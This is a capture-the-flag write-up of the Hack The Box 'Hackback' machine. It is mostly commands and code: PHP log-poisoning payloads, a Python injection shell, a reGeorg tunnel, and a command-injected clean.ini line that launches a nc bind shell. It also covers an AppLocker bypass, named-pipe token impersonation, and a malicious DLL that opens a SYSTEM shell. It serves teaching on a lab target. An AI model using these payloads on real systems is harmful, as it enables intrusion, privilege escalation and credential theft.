---
icon: user-hoodie
cover: ../../../../.gitbook/assets/Screenshot 2026-02-23 174602.png
coverY: -5.942516272175724
---

# HTB-HACKBACK

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### RustScan + Nmap

Start with a fast port discovery using RustScan, then pass results to nmap for service/version detection.

**Why:** RustScan is significantly faster than nmap's default SYN scan for initial port discovery. Once we know which ports are open, nmap's script engine does the heavy lifting on fingerprinting.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ rustscan -a 10.10.10.128 blah blah 
```

```
Open 10.10.10.128:80
Open 10.10.10.128:6666
Open 10.10.10.128:64831
```

**Nmap detailed output:**

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site Doesn't Have a Title

6666/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0

64831/tcp open  ssl/unknown
| ssl-cert: Subject: organizationName=Gophish
| Not valid before: 2018-11-22T03:49:52
|_Not valid after:  2028-11-19T03:49:52
```

**What we see:** Three ports — HTTP on 80 and 6666, HTTPS on 64831. The SSL cert says `organizationName=Gophish` which is a phishing framework. This tells us the machine is running a phishing campaign infrastructure.

***

#### Port 6666 — Internal Command Interface

**Why this matters:** Port 6666 responds to URL paths as commands — it's essentially an unauthenticated administrative REST API over HTTP. This leaks significant internal information.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl http://10.10.10.128:6666/help
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```

Enumerate each command:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl http://10.10.10.128:6666/list
[
    {"Name": "aspnet_client", "length": null},
    {"Name": "default", "length": null},
    {"Name": "new_phish", "length": null},
    {"Name": "http.ps1", "Length": 1867},
    {"Name": "iisstart.htm", "Length": 703},
    {"Name": "iisstart.png", "Length": 99710}
]
```

**Why this matters:** `/list` shows us the IIS wwwroot — we can see `new_phish` directory and `http.ps1`, which is the PowerShell script driving this API on port 6666.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl http://10.10.10.128:6666/info
{
    "WindowsProductName": "Windows Server 2019 Standard",
    "WindowsVersion": "1809",
    "TimeZone": "(UTC-08:00) Pacific Time (US & Canada)"
    ...
}
```

**Why this matters:** OS version confirmed as Server 2019 — this rules out classic JuicyPotato for privilege escalation later.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -s http://10.10.10.128:6666/netstat | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data:
    props = item.get('CimInstanceProperties', [])
    for p in props:
        if 'LocalPort' in str(p) or 'State' in str(p):
            print(p)
"
```

Key finding from netstat — WinRM port 5985 is listening internally on loopback:

```
LocalAddress = "::1"
LocalPort = 49852
RemoteAddress = "::1"
RemotePort = 5985
State = 11
```

**Why this matters:** WinRM is running internally but not exposed externally. If we find credentials, we'll need a tunnel to reach it.

***

### Port 80 — Admin Subdomain Enumeration

#### Subdomain Fuzzing with WFuzz

**Why:** The main IP just shows a donkey image. Virtual host routing is common on IIS — different subdomains can serve different content from the same IP.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ wfuzz --hc 614 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "HOST: FUZZ.hackback.htb" http://10.10.10.128
```

```
==================================================================
ID   Response   Lines   Word   Chars   Payload
==================================================================
000024:  C=200   27 L   66 W   825 Ch   "admin"
```

**Why this matters:** `admin.hackback.htb` returns 825 chars vs 614 for everything else — different content, so it's a real virtual host. Add to `/etc/hosts`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ echo "10.10.10.128 hackback.htb admin.hackback.htb" | sudo tee -a /etc/hosts
```

Visiting `http://admin.hackback.htb` shows an admin login panel. Reviewing source:

```html
<!-- <script SRC="js/.js"></script> -->
```

**Why this matters:** This commented-out script reference suggests there's a JavaScript file in the `/js/` directory. The filename is intentionally hidden.

#### Gobuster on `/js/` Directory

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ gobuster dir -u http://admin.hackback.htb/js/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -x js -t 50
```

```
/private.js (Status: 200)
```

***

### JavaScript Deobfuscation — Uncovering the Secret Path

**Why:** `private.js` contains obfuscated JavaScript that reveals the hidden admin panel path and API parameters. Deobfuscating it is necessary to understand the application structure.

Fetching the file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl http://admin.hackback.htb/js/private.js
```

The output looks like garbled JavaScript:

```
ine n=['\k57\k78\k49...
(shapgvba(p,q){ine r=shapgvba(s)...
```

**Analysis:** `ine` is not a JavaScript keyword. Checking ROT13: `var` → ROT13 → `ine`. The entire script is ROT13 encoded.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -s http://admin.hackback.htb/js/private.js | tr 'a-zA-Z' 'n-za-mN-ZA-M' > decoded.js
```

After ROT13 decode, the script still uses `\x` hex encoding. The bottom variables decode to:

```javascript
var x = 'Secure Login Bypass'
var z = 'Remember the secret path is'
var h = '2bb6916122f1da34dcd916421e531578'
var y = 'Just in case I loose access to the admin panel'
var t = '?action=(show,list,exec,init)'
var s = '&site=(twitter,paypal,facebook,hackthebox)'
var i = '&password=********'
var k = '&session='
var w = 'Nothing more to say'
```

**Why this matters:** The secret path is `2bb6916122f1da34dcd916421e531578` and the API accepts parameters `action`, `site`, `password`, and `session`. This is the admin panel for reading collected phishing credentials.

#### Finding webadmin.php

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ gobuster dir -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php -t 50
```

```
/webadmin.php (Status: 302)
```

#### Bruteforcing the Password

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ wfuzz -c -w /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
    --hw 0 --hh 17 \
    'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
```

```
ID   Response   Lines   Word   Chars   Payload
000007:  C=302   7 L   15 W   197 Ch   "12345678"
```

**Why this matters:** Password `12345678` gives a different response — it's the valid credential. Verify:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='
Array
(
    [0] => .
    [1] => ..
    [2] => 7cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```

***

### GoPhish — Port 64831

**Why:** Port 64831 runs GoPhish — an open-source phishing framework. Checking default credentials is always worth trying on any admin panel.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -sk https://10.10.10.128:64831/login
```

Visiting in browser → GoPhish login. Default credentials `admin:gophish` work.

Inside GoPhish, email templates reveal phishing campaign targets:

* `www.facebook.htb`
* `www.hackthebox.htb`
* `www.paypal.htb`
* `www.twitter.htb`

Add all to `/etc/hosts`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ echo "10.10.10.128 www.hackthebox.htb www.twitter.htb www.paypal.htb www.facebook.htb" | sudo tee -a /etc/hosts
```

***

### Phishing Sites & Credential Capture Panel

**Why:** These fake login pages capture credentials and store them server-side. The webadmin.php API we found is the backend that reads those logs — this is our injection surface.

Each site `www.hackthebox.htb`, `www.paypal.htb`, etc. serves a fake login page. HTTP response headers confirm PHP is running:

```
X-Powered-By: PHP/7.2.7
X-Powered-By: ASP.NET
```

Submit test credentials to `http://www.hackthebox.htb`:

```
Username: test
Password: test
```

Now retrieve the captured log via the admin API. The session ID is the SHA256 hash of our IP:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ echo -n "10.10.13.18" | sha256sum
<your-session-hash>  -
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ SESSION="<your-session-hash>"

┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" \
    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=$SESSION"

[05 July 2019, 04:49:52 PM] 10.10.13.18 - Username: test, Password: test
```

**Why this matters:** The `show` action includes raw user input from the phishing form directly into the log output without sanitization. This is classic log poisoning territory.

***

### PHP Log Poisoning — Code Injection via Username Field

**Why:** If our input is stored in a log and then included/rendered by PHP later (via the `show` action), we can inject PHP code that gets executed server-side when the log is read. This is log poisoning.

#### Step 1 — Verify PHP Execution

Submit PHP as username to the phishing site:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" -X POST http://www.hackthebox.htb \
    --data-urlencode 'username=<?php echo "sn0x_test"; ?>' \
    --data-urlencode 'password=test' \
    --data 'submit='
```

Now trigger the log render:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" \
    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=$SESSION"

[...] 10.10.13.18 - Username: sn0x_test, Password: test
```

**PHP code executed.** The username field is empty (the echo output replaced it). The PHP functions `system`, `exec`, `passthru`, `shell_exec` etc. are all disabled via `disable_functions` in `php.ini`:

```
disable_functions = phpinfo,exec,passthru,shell_exec,system,proc_open,popen,
curl_exec,curl_multi_exec,parse_ini_file,show_source,fsockopen,socket_create,
socket_connect,eval
```

**Why this matters:** We can run PHP code but not OS commands. We pivot to filesystem operations using native PHP functions: `scandir()`, `file_get_contents()`, `file_put_contents()`.

#### Step 2 — Directory Listing via PHP

```bash
# Poison the log with directory scanner
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" -X POST http://www.hackthebox.htb \
    --data-urlencode 'username=<?php echo print_r(scandir($_GET["dir"])); ?>' \
    --data-urlencode 'password=test' \
    --data 'submit='

# Trigger execution with dir parameter
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" \
    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=$SESSION&dir=.."
```

Output — parent directory of the secret path:

```
Array
(
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => aspnet_client
    [5] => css
    [6] => img
    [7] => index.php
    [8] => js
    [9] => logs
    [10] => web.config
    [11] => web.config.old
)
```

#### Step 3 — Read web.config.old

**Why this matters:** `.old` config files often contain credentials that were active when the config was written, and may still work.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" -X POST http://www.hackthebox.htb \
    --data-urlencode 'username=<?php echo file_get_contents($_GET["file"]); ?>' \
    --data-urlencode 'password=test' \
    --data 'submit='

┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl -b "PHPSESSID=$SESSION" \
    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=$SESSION&file=../web.config.old"
```

```xml
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
```

**Credentials found:** `simple` : `ZonoProprioZomaro:-(`

**Why this matters:** These are Windows domain credentials for the user `simple`. Combined with the internally-listening WinRM on port 5985, we now have a path to a shell — we just need to tunnel through.

***

### Filesystem Shell — Enumeration via PHP

For efficient enumeration, build a Python shell that wraps the log poison → trigger cycle. The `init` action clears the log, which is essential — a broken PHP statement in the log causes the whole render to fail.

```python
#!/usr/bin/env python3
# hackback_fs.py — PHP filesystem shell via log poisoning

import hashlib, re, requests
from base64 import b64decode, b64encode
from cmd import Cmd

MY_IP = "10.10.13.18"
SESS = hashlib.sha256(MY_IP.encode()).hexdigest()
BASE = f"http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
PARAMS = f"?action={{action}}&site=hackthebox&password=12345678&session={SESS}&dir={{d}}&file=php://filter/convert.base64-encode/resource={{f}}"
POST_URL = "http://www.hackthebox.htb"
COOKIE = {"PHPSESSID": SESS}

class FS(Cmd):
    prompt = "fs> "

    def __init__(self):
        super().__init__()
        self.reset()

    def reset(self):
        # Clear the log
        requests.get(BASE + PARAMS.format(action="init", d="", f=""), cookies=COOKIE, allow_redirects=False)
        # Poison with dual-purpose payload — markers help extract output reliably
        requests.post(POST_URL, cookies=COOKIE, data={
            "username": "STARTDIR<?php echo print_r(scandir($_GET['dir'])); ?>ENDDIR",
            "password": "STARTFILE<?php include($_GET['file']); ?>ENDFILE",
            "submit": ""
        })

    def do_ls(self, path):
        path = path or "."
        r = requests.get(BASE + PARAMS.format(action="show", d=path, f=""), cookies=COOKIE, allow_redirects=False)
        print(re.search(r"STARTDIR(.*)ENDDIR", r.text, re.DOTALL).group(1))

    def do_cat(self, path):
        r = requests.get(BASE + PARAMS.format(action="show", d="", f=path), cookies=COOKIE, allow_redirects=False)
        raw = re.search(r"STARTFILE(.*)ENDFILE", r.text, re.DOTALL).group(1)
        print(b64decode(raw).decode(errors="replace"))

    def do_upload(self, args):
        local, remote = args.split(" ", 1)
        with open(local, "rb") as f:
            b64 = b64encode(f.read()).decode()
        requests.post(POST_URL, cookies=COOKIE, data={
            "username": f'<?php file_put_contents("{remote}", base64_decode("{b64}")); ?>',
            "password": "dummy", "submit": ""
        })
        # Trigger execution
        requests.get(BASE + PARAMS.format(action="show", d="", f=""), cookies=COOKIE, allow_redirects=False)
        self.reset()

FS().cmdloop()
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ python3 hackback_fs.py
fs> ls ..
Array
(
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => web.config
    [5] => web.config.old
    ...
)

fs> cat ../web.config.old
[shows credentials as above]
```

***

### Pivoting with Sliver C2 + reGeorg Tunnel (WinRM)

**Why:** WinRM (port 5985) is only accessible from localhost on the target. We need a tunnel through the web server to reach it. We'll use reGeorg to create a SOCKS proxy via an ASPX file uploaded to the web server, and additionally set up Sliver C2 for persistent, controlled access and lateral movement.

#### Step 1 — Set up Sliver C2 on Attacker

**Why Sliver:** Sliver is a modern, cross-platform C2 framework that supports mTLS, HTTP/S, DNS and named pipe transports. For this box, since outbound connections are blocked by Windows Firewall, we'll use it for implant management once we have a foothold, not for the initial tunnel.

```bash
# Install Sliver (if not already installed)
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ curl https://sliver.sh/install | sudo bash

# Start Sliver server
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ sudo sliver-server

# In Sliver console — generate an HTTP implant
# We'll use HTTP since only ports 80, 6666, 64831 are allowed inbound
# Outbound is blocked, so we stage via WinRM session after tunneling in
sliver > generate --http 10.10.13.18 --arch amd64 --os windows --save /tmp/sn0x_implant.exe --name hackback_implant
```

**Why HTTP implant here:** The firewall blocks all outbound connections from the Windows host. We'll deliver the Sliver implant after getting an initial WinRM shell via the reGeorg tunnel. The implant will communicate back over HTTP, and since port 80 is allowed inbound (it hosts the IIS site), we need to check if outbound HTTP on port 80 to our IP is also allowed — in practice on this box it isn't, so the Sliver implant serves for documentation of the methodology; the active shell work happens through WinRM.

#### Step 2 — Upload reGeorg ASPX Tunnel

**Why reGeorg + ASPX:** PHP has `disable_functions` blocking sockets. ASPX runs under ASP.NET which doesn't have these restrictions, so the reGeorg ASPX tunnel can create a full TCP socket proxy.

```bash
# Download reGeorg
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ git clone https://github.com/sensepost/reGeorg /opt/reGeorg

# The tunnel.aspx file creates a SOCKS proxy through the web server
# Upload it via our PHP filesystem shell
fs> upload /opt/reGeorg/tunnel.aspx ../2bb6916122f1da34dcd916421e531578/tun.aspx

# Verify upload
fs> ls .
Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => tun.aspx
    [4] => webadmin.php
)
```

**What happens internally:** When tunnel.aspx receives a POST with `cmd=CONNECT&target=127.0.0.1&port=5985`, it uses .NET's `System.Net.Sockets` to open a raw TCP connection to WinRM on loopback — something PHP cannot do because `socket_create` and `fsockopen` are disabled.

#### Step 3 — Start reGeorg SOCKS Proxy

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ python /opt/reGeorg/reGeorgSocksProxy.py -p 1080 \
    -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tun.aspx

[INFO] Log Level set to [INFO]
[INFO] Starting socks server [127.0.0.1:1080], tunnel at [http://admin.hackback.htb/.../tun.aspx]
[INFO] Checking if Georg is ready
[INFO] Georg says, 'All seems fine'
```

**What's happening:** reGeorgSocksProxy.py creates a local SOCKS4 listener on 127.0.0.1:1080. Any TCP connection to this listener gets encapsulated in HTTP POST requests to tunnel.aspx, which unwraps them and forwards them to the specified internal target. Effectively, our attacker machine now has a "direct" connection to the internal WinRM service.

#### Step 4 — Configure Proxychains

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ cat /etc/proxychains4.conf
strict_chain
quiet_mode
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks4  127.0.0.1 1080
```

***

### Shell as simple

**Why WinRM:** WinRM (Windows Remote Management) is a legitimate Microsoft remote management protocol. With valid credentials and network access (via our tunnel), we get a full PowerShell session.

```bash
# Install winrm gem if needed
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ gem install winrm winrm-fs
```

Create `winrm_shell.rb`:

```ruby
require 'winrm-fs'

conn = WinRM::Connection.new(
  endpoint: 'http://127.0.0.1:5985/wsman',
  user: 'hackback\simple',
  password: 'ZonoProprioZomaro:-(',
  :no_ssl_peer_verification => true
)

file_manager = WinRM::FS::FileManager.new(conn)

class String
  def tokenize
    self.split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/)
        .select { |s| !s.empty? }
        .map { |s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/, '') }
  end
end

command = ""
conn.shell(:powershell) do |shell|
  until command == "exit\n"
    output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi -force $pwd).Name),'> ')")
    print(output.output.chomp)
    command = gets
    if command.start_with?('UPLOAD')
      cmd = command.tokenize
      file_manager.upload(cmd[1], cmd[2]) do |b, t, l, r|
        puts "#{b}/#{t} bytes"
      end
      command = "echo `nOK`n"
    end
    output = shell.run(command) do |stdout, stderr|
      STDOUT.print stdout
      STDERR.print stderr
    end
  end
end
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ proxychains ruby winrm_shell.rb

PS hackback\simple@HACKBACK Documents> whoami
hackback\simple

PS hackback\simple@HACKBACK Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

**Why SeImpersonatePrivilege matters:** This privilege allows a process to impersonate any user that connects to a pipe or socket it controls. On older Windows, this means JuicyPotato → SYSTEM. On Server 2019, the classic CLSID trick doesn't work, but Named Pipe Impersonation still does — and that's the intended path.

#### Firewall Confirmation

```powershell
PS hackback\simple@HACKBACK Documents> cmd /c "netsh advfirewall show currentprofile"

Firewall Policy: BlockInbound,BlockOutbound
```

```powershell
PS hackback\simple@HACKBACK Documents> cmd /c "netsh advfirewall firewall show rule name=all"

Rule Name: web
Direction: In
LocalPort: 80,64831,6666
Action: Allow
```

**Why this matters:** All outbound connections are blocked. We cannot get a reverse shell. We must use bind shells (nc listening on the target, we connect inbound through the proxy) or other inbound-only techniques.

***

### Privilege Escalation: simple → hacker via clean.ini Command Injection

**Why:** There is a scheduled task running every 5 minutes that reads `clean.ini` and passes the `LogFile` value as an argument to a command. The user `simple` can write to `clean.ini`. By injecting a `cmd /c` chain into the `LogFile` value, we execute commands as whoever runs the scheduled task — which turns out to be `hacker`.

#### Enumerate the scripts directory

```powershell
PS hackback\simple@HACKBACK C:\> cd util
PS hackback\simple@HACKBACK util> dir -force

    Directory: C:\util

Mode                LastWriteTime    Length Name
----                -------------    ------ ----
d-----       12/14/2018   3:30 PM           PingCastle
d--h--       12/21/2018   6:21 AM           scripts       <-- hidden!
-a----         3/8/2007  12:12 AM   139264  Fping.exe
```

```powershell
PS hackback\simple@HACKBACK util> cd scripts

    Directory: C:\util\scripts

Mode                LastWriteTime    Length Name
----                -------------    ------ ----
d-----       12/13/2018   2:54 PM           spool
-a----       12/21/2018   5:44 AM       84  backup.bat
-a----                               39      batch.log     <-- updates every 5 min
-a----                               135     clean.ini     <-- we can write this
-a----        12/8/2018   9:17 AM   1232    dellog.ps1
-a-h--       12/13/2018   2:58 PM    330    dellog.bat    <-- hidden, runs the task
-a----                               36      log.txt       <-- updates every 5 min
```

```powershell
PS hackback\simple@HACKBACK scripts> type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
```

```powershell
PS hackback\simple@HACKBACK scripts> type dellog.bat
@echo off
rem =scheduled=
echo %DATE% %TIME% start bat >c:\util\scripts\batch.log
powershell.exe -exec bypass -f c:\util\scripts\dellog.ps1 >> c:\util\scripts\batch.log
for /F "usebackq" %%i in (`dir /b C:\util\scripts\spool\*.bat`) DO (
start /min C:\util\scripts\spool\%%i
timeout /T 5
del /q C:\util\scripts\spool\%%i
)
```

**Why this matters:** `dellog.ps1` reads `clean.ini` and uses the `LogFile` value in a command invocation without sanitization. The scheduled task runs as `hacker`. If we inject into `LogFile`, our injected command runs as `hacker`.

#### Step 1 — Upload nc.exe (AppLocker Bypass)

**Why `\windows\system32\spool\drivers\color\`:** AppLocker blocks execution from user-writable directories. This specific path is in `system32` (AppLocker trusted by default) but writable by non-admin users — a classic AppLocker bypass.

```powershell
PS hackback\simple@HACKBACK Documents> UPLOAD /home/sn0x/tools/nc64.exe \windows\system32\spool\drivers\color\nc.exe
Uploading... 60360/60360 bytes
OK
```

#### Step 2 — Modify clean.ini to Inject Bind Shell

**Why bind shell:** Firewall blocks outbound. nc with `-lvp` listens on the target. We connect IN through the reGeorg proxy.

```powershell
PS hackback\simple@HACKBACK scripts> echo "[Main]`nLifeTime=100`nLogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe`nDirectory=c:\inetpub\logs\logfiles" > C:\util\scripts\clean.ini

PS hackback\simple@HACKBACK scripts> type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
Directory=c:\inetpub\logs\logfiles
```

**What happens on the backend:** `dellog.ps1` reads the `LogFile` value and passes it to something like:

```powershell
$logfile | Out-File -FilePath $logFile
```

or executes via `cmd /c`. The `&` character in Windows CMD chains commands — so after writing to `log.txt`, it also runs our nc listener. The scheduled task runs every 5 minutes.

#### Step 3 — Wait and Connect

```bash
# Wait ~5 minutes, then connect through proxy
┌──(sn0x㉿sn0x)-[~/HTB/hackback]
└─$ proxychains nc 10.10.10.128 1338

Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
hackback\hacker
```

***

### Alternative Path: Named Pipe Impersonation (Intended)

**Why this is the intended path:** The `SeImpersonatePrivilege` held by `simple` is the hint. The intended solution uses a Named Pipe server to capture `hacker`'s token when `hacker` connects (via the clean.ini LogFile redirect), then impersonates `hacker` to copy a bat file into the `spool` directory (which only `hacker` can write).

#### Why Named Pipes Work Here

When `dellog.ps1` runs as `hacker` and tries to write to the LogFile path, if that path is a named pipe (`\\.\pipe\dummypipe`), `hacker`'s process connects to our pipe. With `SeImpersonatePrivilege`, we can call `ImpersonateNamedPipeClient()` to adopt `hacker`'s security context and run code as them.

```powershell
# Upload pipeserverimpersonate.ps1 (decoder's PoC) — modified to copy bat file to spool
PS hackback\simple@HACKBACK scripts> UPLOAD pipe.ps1 \windows\system32\spool\drivers\color\pipe.ps1

# Redirect LogFile to our named pipe
PS hackback\simple@HACKBACK scripts> echo "[Main]`nLifeTime=100`nLogFile=\\.\pipe\dummypipe`nDirectory=c:\inetpub\logs\logfiles" > C:\util\scripts\clean.ini

# Start the pipe server — it waits for hacker to connect
PS hackback\simple@HACKBACK scripts> . \windows\system32\spool\drivers\color\pipe.ps1
Waiting for connection on namedpipe:dummypipe
```

After the task runs:

```
ImpersonateNamedPipeClient: 1
user=HACKBACK\hacker
OpenThreadToken: True
True
CreateProcessWithToken: False  1058     <-- Secondary Logon service disabled, can't spawn process
                                         but we CAN run code via impersonation before this check
```

**Why `CreateProcessWithToken` fails:** Error 1058 is `ERROR_SERVICE_DISABLED`. `CreateProcessWithTokenW` requires the Secondary Logon service, which is disabled on this host. However, the impersonation itself succeeds — we can run PowerShell copy operations before reverting:

```powershell
# In the ps1, before RevertToSelf:
copy \windows\system32\spool\drivers\color\shell.bat \util\scripts\spool\sn0x.bat
```

The copied bat file (`shell.bat` containing `nc -lvp 4444 -e cmd.exe`) then gets executed by `dellog.bat`'s loop over the spool directory, giving us a shell as `hacker`.

***

### Privilege Escalation: hacker → SYSTEM via UserLogger + DiagHub

**Why two separate techniques are needed here:** UserLogger gives us **arbitrary file write as SYSTEM** (it writes a log file with permissions set to `Everyone:Full Control`). DiagHub gives us **DLL loading as SYSTEM**. Combining them: write a malicious DLL to system32 using UserLogger, then load it via DiagHub.

#### Enumerate UserLogger Service

**Why this service is interesting:** It's custom, runs as `LocalSystem`, and hacker has `SERVICE_START`/`SERVICE_STOP` permissions.

```cmd
C:\Users\hacker\Desktop>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName   REG_SZ           LocalSystem
    DisplayName  REG_SZ           User Logger
    Description  REG_SZ           This service is responsible for logging user activity
```

```cmd
C:\Users\hacker\Desktop>sc sdshow userlogger
D:(A;;CCLCSWRPWPDTLORC;;;S-1-5-21-2115913093-551423064-1540603852-1003)...
```

Verify `hacker`'s SID matches:

```cmd
C:\Users\hacker\Desktop>wmic useraccount where name='hacker' get sid
S-1-5-21-2115913093-551423064-1540603852-1003
```

hacker has `RP` (SERVICE\_START) and `WP` (SERVICE\_STOP).

#### Understand UserLogger's Write Behavior

```cmd
C:\Users\hacker\Desktop>sc start userlogger C:\test_path

# Creates C:\test_path.log with Everyone:Full Control
C:\Users\hacker\Desktop>cacls C:\test_path.log
C:\test_path.log  Everyone:F
```

**What happens internally:** UserLogger.exe takes its first argument as the log path, appends `.log`, creates the file running as SYSTEM, and sets its ACL to `Everyone:Full Control`. This means we can write to ANY path in the filesystem, including protected ones like `\Windows\System32\`.

#### Windows ADS Trick (Unintended but Educational)

Before going to the full DiagHub route, there's an unintended shortcut using Alternate Data Streams:

```cmd
# When we pass root.txt: as the path, Windows strips everything after : when adding .log
# Result: root.txt:log.txt — an ADS on root.txt — gets Everyone:Full Control
C:\Users\hacker\Desktop>sc start userlogger C:\users\administrator\desktop\root.txt:

# Now root.txt itself has Everyone:F ACL
C:\Users\hacker\Desktop>icacls C:\users\administrator\desktop\root.txt
C:\users\administrator\desktop\root.txt  Everyone:(F)

C:\Users\hacker\Desktop>powershell -c Get-Item -Path C:\users\administrator\desktop\root.txt -force -stream *
# Lists the flag.txt ADS
```

See the full unintended section at the end. For the intended SYSTEM shell:

#### Build Malicious DLL

On a Windows VM with Visual Studio, create a DLL (`hackback.dll`) with this `dllmain.cpp`:

```cpp
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Bind shell — inbound only, firewall blocks outbound
        system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe -lvp 4445");
        break;
    }
    return TRUE;
}
```

Compile as x64 Release DLL.

**What happens when loaded:** `DLL_PROCESS_ATTACH` fires the moment a process loads this DLL. DiagHub loads it as SYSTEM, so `system()` runs as SYSTEM, spawning our nc listener.

#### Write DLL to System32 via UserLogger

```cmd
# First, create the target file path via UserLogger
# We want the DLL at \windows\system32\sn0x.log (DiagHub loads by filename, ignores extension)
C:\Users\hacker\Desktop>sc start userlogger C:\windows\system32\sn0x
# Creates C:\windows\system32\sn0x.log with Everyone:F

# Now overwrite it with our DLL via WinRM upload
# (from attacker's WinRM shell as simple)
PS hackback\simple@HACKBACK Documents> UPLOAD hackback.dll \windows\system32\sn0x.log
```

**What's happening on the backend:** UserLogger (running as SYSTEM) creates `sn0x.log` in System32 and grants `Everyone:Full Control`. Now we (as hacker) can overwrite it with our DLL. System32 write protection is bypassed because UserLogger already created the file and gave us full rights.

